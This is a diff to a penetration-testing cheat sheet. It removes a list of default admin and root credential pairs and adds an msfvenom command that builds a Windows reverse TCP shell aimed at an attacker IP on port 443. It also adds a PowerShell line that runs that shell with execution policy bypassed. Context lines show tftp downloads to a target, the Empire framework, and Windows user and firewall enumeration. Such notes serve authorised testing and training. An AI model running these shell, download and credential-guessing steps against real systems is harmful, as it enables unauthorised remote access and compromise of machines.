@@ -317,23 +317,7 @@ Google documentation for default passwords and test them:
 site:webapplication.com password
 https://cirt.net/passwords
 ```
-
-```
-admin admin
-admin password
-admin <blank>
-admin nameofservice
-root root
-root admin
-root password
-root nameofservice
-<username if you have> password
-<username if you have> admin
-<username if you have> username
-<username if you have> nameofservice
-```
-```
-Step 3: 
+``` 
 Browse around and look for disclosed PII on site
 
 *Place anything here
@@ -532,6 +516,10 @@ Target:
 tftp -i INSERTIPADDRESS GET wget.exe
 
 ***If Windows 7 and above***
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f psh -o shell_80.ps1
+powershell -ExecutionPolicy Bypass -NoExit -File shell_80.ps1
+
+OR
 
 Empire:
 python /opt/Empire/empire
@@ -569,17 +557,11 @@ execute
 ```
 net users
 ```
-
-
-
 **Localgroups:**
 ```
 net localgroup administrators
 ```
-
-
-
-***Firewall***
+**Firewall**
 ```
 netsh firewall show state
 netsh firewall show config
